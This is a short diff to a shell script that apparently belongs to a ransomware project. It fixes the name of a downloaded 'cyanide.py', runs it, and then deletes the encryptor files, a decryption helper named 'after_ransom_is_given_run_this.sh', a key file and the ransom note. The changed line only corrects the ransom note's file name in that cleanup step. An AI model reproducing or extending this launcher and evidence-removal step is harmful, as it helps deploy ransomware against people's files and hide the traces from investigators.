@@ -3,5 +3,5 @@ mv cyanide.py\?raw=true cyanide.py
 clear
 #!/bin/bash
 python cyanide.py
-rm ./cyanide.py ./monsterwith23faces.py ./run_this.sh ./after_ransom_is_given_run_this.sh ./store.key ./ransom_note
+rm ./cyanide.py ./monsterwith23faces.py ./run_this.sh ./after_ransom_is_given_run_this.sh ./store.key ./ransom_note.txt
 clear
